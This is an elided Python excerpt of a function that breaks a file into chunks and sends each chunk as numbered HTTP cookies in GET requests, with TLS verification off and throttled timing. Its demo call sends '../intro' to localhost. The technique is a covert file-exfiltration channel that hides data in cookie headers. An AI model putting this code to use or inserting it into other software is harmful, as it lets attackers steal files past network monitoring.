...
def send_file(addr, file_path, max_packet_size=1200, time_delay=0.05):
    ...
    try:
        ...
        requests.get(addr, cookies=payload, headers=HEADERS, verify=False)
    ...
    current_chunk = 0
    for chunk in chunks:
        payload = {PACKET_COOKIE + str(current_chunk): chunk.decode()}
        requests.get(addr, cookies=payload, headers=HEADERS, verify=False)
        current_chunk += 1
        sys.stdout.write(".")
        time.sleep(time_delay)
...
if __name__ == "__main__":
    send_file("http://127.0.0.1", "../intro")
